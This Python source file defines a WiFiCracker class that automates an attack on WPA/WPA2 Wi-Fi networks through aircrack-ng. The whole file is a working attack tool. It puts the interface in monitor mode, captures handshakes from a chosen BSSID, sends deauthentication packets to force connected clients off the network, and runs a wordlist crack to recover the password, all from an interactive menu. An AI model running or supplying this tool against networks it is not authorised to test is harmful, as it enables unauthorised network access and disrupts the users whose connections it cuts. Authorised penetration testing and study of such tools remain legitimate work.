import os
import subprocess
import platform
import shutil
from colorama import Fore

class WiFiCracker:
    def __init__(self, interface, bssid=None, channel=None, wordlist=None):
        """
        Initialize the WiFiCracker class with necessary parameters.
        :param interface: Wireless interface (e.g., wlan0).
        :param bssid: (Optional) Target network BSSID.
        :param channel: (Optional) Target network channel.
        :param wordlist: (Optional) Path to wordlist file.
        """
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.wordlist = wordlist
        self.validate_inputs()

    def validate_inputs(self):
        """
        Validate inputs to ensure all required parameters are set correctly.
        """
        if not self.interface:
            raise ValueError(f"{Fore.RED}Interface must be specified.")
        
        if platform.system().lower() == "windows":
            raise EnvironmentError(f"{Fore.RED}Monitor mode is not supported on Windows using airmon-ng.")
        
        if shutil.which("airmon-ng") is None:
            raise FileNotFoundError(f"{Fore.RED}airmon-ng is not installed or not in the PATH. Please install aircrack-ng.")

    def enable_monitor_mode(self):
        """Enable monitor mode on the specified interface."""
        try:
            print(f"[*] Enabling monitor mode on {self.interface}...")
            subprocess.run(["airmon-ng", "start", self.interface], check=True)
            print(f"[+] Monitor mode enabled on {self.interface}")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to enable monitor mode on {self.interface}: {e}")

    def disable_monitor_mode(self):
        """Disable monitor mode on the wireless interface."""
        try:
            print(f"[*] Disabling monitor mode on {self.interface}...")
            subprocess.run(["airmon-ng", "stop", self.interface], check=True)
            print(f"[+] Monitor mode disabled on {self.interface}")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to disable monitor mode on {self.interface}: {e}")
            exit(1)

    def list_networks(self):
        """List available Wi-Fi networks using the wireless interface."""
        try:
            print(f"[*] Scanning for networks using {self.interface}...")
            subprocess.run(["airodump-ng", self.interface], check=True)
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to list networks: {e}")
            exit(1)

    def capture_handshake(self):
        """Capture WPA/WPA2 handshake for the given network."""
        if not self.bssid or not self.channel:
            print(f"[-] BSSID and channel must be set to capture a handshake.")
            return

        try:
            print(f"[*] Capturing handshake on BSSID {self.bssid} at channel {self.channel}...")
            subprocess.run(["airodump-ng", "-c", str(self.channel), "--bssid", self.bssid, "-w", "handshake", self.interface], check=True)
            print(f"[+] Handshake capture complete, saved as handshake-01.cap")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to capture handshake: {e}")
            exit(1)

    def crack_password(self):
        """Attempt to crack the WPA/WPA2 password using the captured handshake and wordlist."""
        if not self.wordlist:
            print(f"[-] Wordlist must be set to crack the password.")
            return

        try:
            print(f"[*] Cracking password for handshake-01.cap using wordlist {self.wordlist}...")
            result = subprocess.run(["aircrack-ng", "-w", self.wordlist, "handshake-01.cap"], check=True, stdout=subprocess.PIPE, text=True)
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to crack password: {e}")
            exit(1)

    def deauthenticate_clients(self):
        """Send deauthentication packets to force clients to reconnect and capture handshakes."""
        if not self.bssid:
            print(f"[-] BSSID must be set to deauthenticate clients.")
            return

        try:
            print(f"[*] Sending deauthentication packets to clients on BSSID {self.bssid}...")
            subprocess.run(["aireplay-ng", "--deauth", "10", "-a", self.bssid, self.interface], check=True)
            print(f"[+] Deauthentication packets sent successfully.")
        except subprocess.CalledProcessError as e:
            print(f"[-] Failed to send deauthentication packets: {e}")
            exit(1)

    def run(self):
        """Run the full WiFi cracking process."""
        self.enable_monitor_mode()
        try:
            self.list_networks()

            while True:
                option = input("Do you want to (1) Capture Handshake, (2) Crack Password, (3) Deauthenticate Clients, or (4) Exit: ")

                if option == "1":
                    if not self.bssid:
                        self.bssid = input("Enter target BSSID: ").strip()
                    if not self.channel:
                        self.channel = input("Enter target channel: ").strip()
                    self.capture_handshake()
                elif option == "2":
                    if not self.wordlist:
                        self.wordlist = input("Enter path to wordlist file: ").strip()
                    self.crack_password()
                elif option == "3":
                    if not self.bssid:
                        self.bssid = input("Enter target BSSID: ").strip()
                    self.deauthenticate_clients()
                elif option == "4":
                    print("Exiting...")
                    return
                else:
                    print(f"{Fore.RED}Invalid choice.")
            
        finally:
            self.disable_monitor_mode()
